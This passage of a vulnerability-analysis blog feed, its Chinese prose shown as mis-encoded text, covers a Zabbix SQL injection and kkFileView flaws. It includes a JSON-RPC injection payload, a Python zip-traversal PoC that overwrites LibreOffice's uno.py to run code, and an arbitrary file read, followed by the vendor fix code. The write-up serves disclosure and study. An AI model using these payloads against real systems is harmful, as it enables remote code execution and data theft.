class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addRelatedObjects</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$options</span>, <span class="keyword">array</span> <span class="variable">$result</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$result</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">addRelatedObjects</span>(<span class="variable">$options</span>, <span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$userIds</span> = <span class="title function_ invoke__">zbx_objectValues</span>(<span class="variable">$result</span>, <span class="string">&#x27;userid&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// adding user role</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;selectRole&#x27;</span>] !== <span class="literal">null</span> &amp;&amp; <span class="variable">$options</span>[<span class="string">&#x27;selectRole&#x27;</span>] !== API_OUTPUT_COUNT) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;selectRole&#x27;</span>] === API_OUTPUT_EXTEND) &#123;</span><br><span class="line">      <span class="variable">$options</span>[<span class="string">&#x27;selectRole&#x27;</span>] = [<span class="string">&#x27;roleid&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;readonly&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$db_roles</span> = <span class="title function_ invoke__">DBselect</span>(</span><br><span class="line">      <span class="string">&#x27;SELECT u.userid&#x27;</span>.(<span class="variable">$options</span>[<span class="string">&#x27;selectRole&#x27;</span>] ? <span class="string">&#x27;,r.&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,r.&#x27;</span>, <span class="variable">$options</span>[<span class="string">&#x27;selectRole&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>).</span><br><span class="line">      <span class="string">&#x27; FROM users u,role r&#x27;</span>.</span><br><span class="line">      <span class="string">&#x27; WHERE u.roleid=r.roleid&#x27;</span>.</span><br><span class="line">      <span class="string">&#x27; AND &#x27;</span>.<span class="title function_ invoke__">dbConditionInt</span>(<span class="string">&#x27;u.userid&#x27;</span>, <span class="variable">$userIds</span>)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$userid</span> =&gt; <span class="variable">$user</span>) &#123;</span><br><span class="line">      <span class="variable">$result</span>[<span class="variable">$userid</span>][<span class="string">&#x27;role&#x27;</span>] = [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$db_role</span> = <span class="title function_ invoke__">DBfetch</span>(<span class="variable">$db_roles</span>)) &#123;</span><br><span class="line">      <span class="variable">$userid</span> = <span class="variable">$db_role</span>[<span class="string">&#x27;userid&#x27;</span>];</span><br><span class="line">      <span class="keyword">unset</span>(<span class="variable">$db_role</span>[<span class="string">&#x27;userid&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">      <span class="variable">$result</span>[<span class="variable">$userid</span>][<span class="string">&#x27;role&#x27;</span>] = <span class="variable">$db_role</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªæ–¹æ³•åœ¨<code>adding user role</code>æ—¶ï¼Œå°†ç”¨æˆ·å¯æ§çš„optionså‚æ•°å†…å®¹ç›´æ¥æ‹¼æ¥åˆ°äº†SQLè¯­å¥ä¸­ï¼Œäºæ˜¯é€ æˆäº†SQLæ³¨å…¥ã€‚å¹¶ä¸”æŸ¥è¯¢ç»“æœä¼šå­˜è¿›<code>$result</code>æ•°ç»„ä¸­è¿”å›ï¼Œæœ€ç»ˆä»¥ json å½¢å¼è¿”å›åˆ°å®¢æˆ·ç«¯ã€‚</p><p><img src="https://s2.loli.net/2024/12/20/Xm3ECKSlDUNWIt9.png" alt="img"></p><p>å¹¶ä¸”è¿™é‡Œæ³¨å…¥çš„ä½ç½®åœ¨æŸ¥è¯¢å­—æ®µå¤„ï¼Œå¯åˆ©ç”¨åº¦ç›¸å½“é«˜ï¼Œäºæ˜¯å¯ä»¥è½»æ¾æ„é€ ç›¸å…³æ¶æ„è¯­å¥</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;jsonrpc&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user.get&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;params&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;selectRole&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;roleid, version()&quot;</span><span class="punctuation">,</span> <span class="string">&quot;roleid&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span> <span class="attr">&quot;userids&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="attr">&quot;auth&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2ae264ef7c19d2c2016a302c64e974c6&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/20/lRNhIozFdMtrxpG.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> cve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
            <tag> zabbix </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kkFileViewå†å²æ¼æ´æ€»ç»“</title>
      <link href="/2024/12/20/kkFileView%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2024/12/20/kkFileView%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<blockquote><p>é¦–å‘äºå¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº <a href="https://forum.butian.net/article/631">https://forum.butian.net/article/631</a></p></blockquote><p><a href="https://github.com/kekingcn/kkFileView">https://github.com/kekingcn/kkFileView</a></p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>kkFileViewä¸ºæ–‡ä»¶æ–‡æ¡£åœ¨çº¿é¢„è§ˆè§£å†³æ–¹æ¡ˆï¼Œè¯¥é¡¹ç›®ä½¿ç”¨æµè¡Œçš„spring bootæ­å»ºï¼Œæ˜“ä¸Šæ‰‹å’Œéƒ¨ç½²ï¼ŒåŸºæœ¬æ”¯æŒä¸»æµåŠå…¬æ–‡æ¡£çš„åœ¨çº¿é¢„è§ˆï¼Œå¦‚doc,docx,xls,xlsx,ppt,pptx,pdf,txt,zip,rar,å›¾ç‰‡,è§†é¢‘,éŸ³é¢‘ç­‰ç­‰</p><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>ä»¥v3.6.0ç¯å¢ƒæ­å»ºä¸ºä¾‹</p><p>é¦–å…ˆä»dockerhubä¸‹è½½å®˜æ–¹dockeré•œåƒ</p><p><img src="https://s2.loli.net/2024/12/20/jZiELl9JxN3g7bk.png" alt="img"></p><p>pullä¸‹æ¥åæ‰§è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 8012:8012 -p 5005:5005 -it --entrypoint /bin/bash  keking/kkfileview:v3.6.0</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰‹åŠ¨å¼€å¯è¿œç¨‹è°ƒè¯•ï¼Œè‡³äºå…¶ä»–å‚æ•°å¯ä»¥å‚è€ƒå®˜æ–¹é•œåƒçš„entrypoint</p><p><img src="https://s2.loli.net/2024/12/20/vQGySr5zxOehtVA.png" alt="img"></p><p><img src="https://s2.loli.net/2024/12/20/GITw7KHxOcim8yn.png" alt="img"></p><p>ç„¶ååœ¨githubæ‹‰å–æºç </p><p><img src="https://s2.loli.net/2024/12/20/TO1XWZ6A7awpPg9.png" alt="img"></p><p>ç„¶åä¸¢è¿›IDEAï¼Œåœ¨é…ç½®ä¸­æ·»åŠ JVMè¿œç¨‹è°ƒè¯•ï¼Œæ¨¡å—é€‰æ‹©kkFileView</p><p><img src="https://s2.loli.net/2024/12/20/CR8qUMl5nicS3Xs.png" alt="img"></p><p>ç„¶åæ­£å¸¸ä¸‹æ–­ç‚¹è°ƒè¯•å³å¯</p><h1 id="æ¼æ´åˆ†æå’Œåˆ©ç”¨"><a href="#æ¼æ´åˆ†æå’Œåˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ†æå’Œåˆ©ç”¨"></a>æ¼æ´åˆ†æå’Œåˆ©ç”¨</h1><h2 id="ä»»æ„æ–‡ä»¶å†™å…¥å¯¼è‡´RCE"><a href="#ä»»æ„æ–‡ä»¶å†™å…¥å¯¼è‡´RCE" class="headerlink" title="ä»»æ„æ–‡ä»¶å†™å…¥å¯¼è‡´RCE"></a>ä»»æ„æ–‡ä»¶å†™å…¥å¯¼è‡´RCE</h2><blockquote><p>4.2.0 &lt;&#x3D; kkFileviw &lt;&#x3D; 4.4.0betaï¼ˆæœ€æ–°åˆ†æ”¯ä¸å—å½±å“ï¼‰</p></blockquote><p>å¯ä»¥ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼Œå¹¶ä¸”å¯ä»¥è¿½åŠ æ–‡ä»¶å†…å®¹ã€‚</p><p>kkFileViewåœ¨ä½¿ç”¨odtè½¬pdfæ—¶ä¼šè°ƒç”¨ç³»ç»Ÿçš„Libreofficeï¼Œè€Œæ­¤è¿›ç¨‹ä¼šè°ƒç”¨åº“ä¸­çš„uno.pyæ–‡ä»¶ï¼Œå› æ­¤å¯ä»¥è¦†ç›–è¯¥pyæ–‡ä»¶çš„å†…å®¹ï¼Œä»è€Œåœ¨å¤„ç†odtæ–‡ä»¶æ—¶ä¼šæ‰§è¡Œuno.pyä¸­çš„æ¶æ„ä»£ç ã€‚</p><h3 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p>è¿™é‡Œå®˜æ–¹çš„dockeråº“ä¸­æ²¡çœ‹åˆ°ç¬¦åˆçš„ç‰ˆæœ¬ï¼Œè¿™é‡Œå°±ç”¨vulhubçš„dockerå¤ç°äº†ï¼Œpç‰›yyds</p><p><img src="https://s2.loli.net/2024/12/20/WJBURK7MogsfvzO.png" alt="img"></p><p>æ ¹æ®è¿™ä¸ªé¡¹ç›®å¯ä»¥å¿«é€Ÿå¤ç°</p><p><a href="https://github.com/luelueking/kkFileView-v4.3.0-RCE-POC">https://github.com/luelueking/kkFileView-v4.3.0-RCE-POC</a></p><p>é¦–å…ˆåˆ¶ä½œä¸€ä¸ªæ¶æ„zip</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        binary1 = <span class="string">b&#x27;ph0ebus&#x27;</span></span><br><span class="line">        binary2 = <span class="string">b&#x27;import os\r\nos.system(\&#x27;touch /tmp/ph0ebus\&#x27;)&#x27;</span></span><br><span class="line">        zipFile = zipfile.ZipFile(<span class="string">&quot;poc.zip&quot;</span>, <span class="string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)</span><br><span class="line">        info = zipfile.ZipInfo(<span class="string">&quot;poc.zip&quot;</span>)</span><br><span class="line">        zipFile.writestr(<span class="string">&quot;test&quot;</span>, binary1)</span><br><span class="line">        zipFile.writestr(<span class="string">&quot;../../../../../../../../../../../../../../../../../../../opt/libreoffice7.5/program/uno.py&quot;</span>, binary2)</span><br><span class="line">        zipFile.close()</span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> e</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ zipå¹¶é¢„è§ˆï¼Œéœ€è¦æ³¨æ„çš„æ˜¯urlçš„é—®é¢˜ï¼Œç”±äºè¿™é‡Œåœ¨æœ¬åœ°è™šæ‹Ÿæœºè·‘çš„ï¼Œdockerå®¹å™¨è®¿é—®ä¸åˆ°192.168.182.1&#x2F;24çš„æ®µï¼Œäºæ˜¯é»˜è®¤çš„é¢„è§ˆä¼šè¿æ¥è¶…æ—¶ï¼Œå¯ä»¥é‡æ–°è®¾ç½®ç›¸å…³ç¯å¢ƒå˜é‡çš„urlï¼Œä¹Ÿå¯ä»¥æ‰‹åŠ¨æ”¹ä¸€ä¸‹å‚æ•°å€¼</p><p><img src="https://s2.loli.net/2024/12/20/SGBqITL41FQkAdl.png" alt="img"></p><p><img src="https://s2.loli.net/2024/12/20/N5odTpvZGlFK731.png" alt="img"></p><p>è¿›å®¹å™¨æŸ¥çœ‹ä¸€ä¸‹uno.pyçš„æ–‡ä»¶å†…å®¹ï¼Œå¯ä»¥çœ‹åˆ°æ–‡ä»¶æœ«å°¾è¿½åŠ äº†æ¶æ„ä»£ç </p><p><img src="https://s2.loli.net/2024/12/20/w5Yl4HsaONWRyFc.png" alt="img"></p><p>ç„¶åéšä¾¿åœ¨officeåˆ›å»ºä¸€ä¸ªodtæ–‡ä»¶</p><p><img src="https://s2.loli.net/2024/12/20/WXUe4sAYH2vNFfK.png" alt="img"></p><p>ä¸Šä¼ å¹¶é¢„è§ˆ</p><p><img src="https://s2.loli.net/2024/12/20/rgHJ3GdMDbsWSep.png" alt="img"></p><p>æˆåŠŸè§¦å‘æ ¼å¼è½¬æ¢ï¼Œå¹¶æ‰§è¡Œuno.pyçš„æ¶æ„ä»£ç ï¼Œåˆ›å»ºäº†æŒ‡å®šæ–‡ä»¶</p><p><img src="https://s2.loli.net/2024/12/20/CBnyipxASOv9JWb.png" alt="img"></p><p><img src="https://s2.loli.net/2024/12/20/kb1hJs8XfOYoLiw.png" alt="img"></p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p><img src="https://s2.loli.net/2024/12/20/re3GoH7Muw8FVYJ.png" alt="img"></p><p>è·Ÿè¿›<code>cn.keking.service.impl.CompressFilePreviewImpl#filePreviewHandle</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">filePreviewHandle</span><span class="params">(String url, Model model, FileAttribute fileAttribute)</span> &#123;</span><br><span class="line">    String fileName=fileAttribute.getName();</span><br><span class="line">    <span class="type">String</span> <span class="variable">filePassword</span> <span class="operator">=</span> fileAttribute.getFilePassword();</span><br><span class="line">    <span class="type">boolean</span> forceUpdatedCache=fileAttribute.forceUpdatedCache();</span><br><span class="line">    <span class="type">String</span> <span class="variable">fileTree</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// åˆ¤æ–­æ–‡ä»¶åæ˜¯å¦å­˜åœ¨(redisç¼“å­˜è¯»å–)</span></span><br><span class="line">    <span class="keyword">if</span> (forceUpdatedCache || !StringUtils.hasText(fileHandlerService.getConvertedFile(fileName))  || !ConfigConstants.isCacheEnabled()) &#123;</span><br><span class="line">        ReturnResponse&lt;String&gt; response = DownloadUtils.downLoad(fileAttribute, fileName);</span><br><span class="line">        <span class="keyword">if</span> (response.isFailure()) &#123;</span><br><span class="line">            <span class="keyword">return</span> otherFilePreview.notSupportedFile(model, fileAttribute, response.getMsg());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> response.getContent();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fileTree = compressFileReader.unRar(filePath, filePassword,fileName);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Throwable[] throwableArray = ExceptionUtils.getThrowables(e);</span><br><span class="line">            <span class="keyword">for</span> (Throwable throwable : throwableArray) &#123;</span><br><span class="line">                <span class="keyword">if</span> (throwable <span class="keyword">instanceof</span> IOException || throwable <span class="keyword">instanceof</span> EncryptedDocumentException) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (e.getMessage().toLowerCase().contains(Rar_PASSWORD_MSG)) &#123;</span><br><span class="line">                        model.addAttribute(<span class="string">&quot;needFilePassword&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">                        <span class="keyword">return</span> EXEL_FILE_PREVIEW_PAGE;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!ObjectUtils.isEmpty(fileTree)) &#123;</span><br><span class="line">            <span class="comment">//æ˜¯å¦ä¿ç•™å‹ç¼©åŒ…æºæ–‡ä»¶</span></span><br><span class="line">            <span class="keyword">if</span> (ConfigConstants.getDeleteSourceFile()) &#123;</span><br><span class="line">                KkFileUtils.deleteFileByPath(filePath);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (ConfigConstants.isCacheEnabled()) &#123;</span><br><span class="line">                <span class="comment">// åŠ å…¥ç¼“å­˜</span></span><br><span class="line">                fileHandlerService.addConvertedFile(fileName, fileTree);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> otherFilePreview.notSupportedFile(model, fileAttribute, <span class="string">&quot;å‹ç¼©æ–‡ä»¶å¯†ç é”™è¯¯! å‹ç¼©æ–‡ä»¶æŸå!  å‹ç¼©æ–‡ä»¶ç±»å‹ä¸å—æ”¯æŒ!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        fileTree = fileHandlerService.getConvertedFile(fileName);</span><br><span class="line">    &#125;</span><br><span class="line">    model.addAttribute(<span class="string">&quot;fileName&quot;</span>, fileName);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;fileTree&quot;</span>, fileTree);</span><br><span class="line">    <span class="keyword">return</span> COMPRESS_FILE_PREVIEW_PAGE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼šä¸‹è½½demoæ–‡ä»¶ä¸‹çš„poc.zipï¼Œç„¶ååœ¨<code>cn.keking.service.CompressFileReader#unRar</code>æ‰§è¡Œè§£å‹æ“ä½œ</p><p><img src="https://s2.loli.net/2024/12/20/jB4EixA8rftUHsm.png" alt="img"></p><p>è¿™é‡Œåœ¨é‡Šæ”¾å‹ç¼©åŒ…çš„æ–‡ä»¶æ—¶å°†è¢«å‹ç¼©çš„æ–‡ä»¶ç›´æ¥ä¸è·¯å¾„è¿›è¡Œæ‹¼æ¥å¹¶å°†å†…å®¹å†™å…¥åˆ°å¯¹åº”è·¯å¾„ä¸‹ï¼Œç”±äºæœªå¯¹æ­¤è¿›è¡Œè¿‡æ»¤é€ æˆäº†ä»»æ„æ–‡ä»¶å†™å…¥</p><h3 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h3><p>æ¼æ´åœ¨4.4.0-betaæœ€æ–°ç‰ˆè¢«ä¿®å¤</p><p><a href="https://github.com/kekingcn/kkFileView/commit/421a2760d58ccaba4426b5e104938ca06cc49778">https://github.com/kekingcn/kkFileView/commit/421a2760d58ccaba4426b5e104938ca06cc49778</a></p><p>é‡æ„äº†è§£å‹é€»è¾‘ï¼Œå¹¶åŠ å…¥äº†è·¯å¾„éªŒè¯çš„å‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Path <span class="title function_">getFilePathInsideArchive</span><span class="params">(ISimpleInArchiveItem item, Path folderPath)</span> <span class="keyword">throws</span> SevenZipException, UnsupportedEncodingException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">insideFileName</span> <span class="operator">=</span> RarUtils.getUtf8String(item.getPath());</span><br><span class="line">    <span class="keyword">if</span> (RarUtils.isMessyCode(insideFileName)) &#123;</span><br><span class="line">        insideFileName = <span class="keyword">new</span> <span class="title class_">String</span>(item.getPath().getBytes(StandardCharsets.ISO_8859_1), <span class="string">&quot;gbk&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ­£è§„åŒ–è·¯å¾„å¹¶éªŒè¯æ˜¯å¦å®‰å…¨</span></span><br><span class="line">    <span class="type">Path</span> <span class="variable">normalizedPath</span> <span class="operator">=</span> folderPath.resolve(insideFileName).normalize();</span><br><span class="line">    <span class="keyword">if</span> (!normalizedPath.startsWith(folderPath)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Unsafe path detected: &quot;</span> + insideFileName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Files.createDirectories(normalizedPath.getParent());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Failed to create directory: &quot;</span> + normalizedPath.getParent(), e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> normalizedPath;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é™åˆ¶äº†é‡Šæ”¾åçš„æ–‡ä»¶åªèƒ½åœ¨å½“å‰ç›®å½•ä¸‹</p><h2 id="ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–"></a>ä»»æ„æ–‡ä»¶è¯»å–</h2><blockquote><p> kkFileView &lt;&#x3D; v3.6.0ï¼Œ&lt;&#x3D; 4.0.0</p></blockquote><h3 id="å¤ç°-1"><a href="#å¤ç°-1" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p><img src="https://s2.loli.net/2024/12/20/Gm5q4O2TV1RUjNY.png" alt="img"></p><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>æŸ¥çœ‹æºç ï¼Œè·¯ç”±å†…å®¹å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ ¹æ®urlè·å–æ–‡ä»¶å†…å®¹</span></span><br><span class="line"><span class="comment"> * å½“pdfjsè¯»å–å­˜åœ¨è·¨åŸŸé—®é¢˜çš„æ–‡ä»¶æ—¶å°†é€šè¿‡æ­¤æ¥å£è¯»å–</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> urlPath  url</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> response response</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;/getCorsFile&quot;, method = RequestMethod.GET)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getCorsFile</span><span class="params">(String urlPath, HttpServletResponse response)</span> &#123;</span><br><span class="line">    logger.info(<span class="string">&quot;ä¸‹è½½è·¨åŸŸpdfæ–‡ä»¶urlï¼š&#123;&#125;&quot;</span>, urlPath);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> WebUtils.normalizedURL(urlPath);</span><br><span class="line">        <span class="type">byte</span>[] bytes = NetUtil.downloadBytes(url.toString());</span><br><span class="line">        IOUtils.write(bytes, response.getOutputStream());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException | GalimatiasParseException e) &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;ä¸‹è½½è·¨åŸŸpdfæ–‡ä»¶å¼‚å¸¸ï¼Œurlï¼š&#123;&#125;&quot;</span>, urlPath, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªè·¨åŸŸæ–‡ä»¶è¯»å–çš„æ¥å£ï¼Œä½†æ²¡æœ‰å¯¹è¿™é‡Œçš„urlPathåšé™åˆ¶ï¼Œç”±äºæ”¯æŒfileåè®®å¯¼è‡´äº†éé¢„æœŸçš„æœ¬åœ°æ–‡ä»¶è¯»å–</p><p>åœ¨WebUtilsç±»å¤„ç†åï¼Œä¼ å…¥çš„fileåè®®å­—ç¬¦ä¸²è§£æä¸º<code>galimatias</code> åº“çš„ <code>URL</code>å¯¹è±¡ï¼Œç„¶åé€šè¿‡toJavaURLæ–¹æ³•è½¬æ¢ä¸ºäº†javaåŸç”Ÿçš„URLå¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> URL <span class="title function_">normalizedURL</span><span class="params">(String urlStr)</span> <span class="keyword">throws</span> GalimatiasParseException, MalformedURLException &#123;</span><br><span class="line">    <span class="keyword">return</span> io.mola.galimatias.URL.parse(urlStr).toJavaURL();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/20/uDJVYr7WqPTBmMa.png" alt="img"></p><p>æ¥ç€é€šè¿‡<code>jodd.io.NetUtil#downloadBytes</code>æ ¹æ®URLå¯¹è±¡è¯»å–å­—èŠ‚æµ</p><p><img src="https://s2.loli.net/2024/12/20/nRTA9QGidsluBLX.png" alt="img"></p><p>æœ€åé€šè¿‡<code>fr.opensagres.xdocreport.core.io.IOUtils#write</code>æ–¹æ³•å†™å…¥åˆ°responseä¸­å›æ˜¾</p><h3 id="ä¿®å¤-1"><a href="#ä¿®å¤-1" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h3><p>v4.1.0ç‰ˆæœ¬ä¸­ä¿®å¤åçš„ä»£ç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 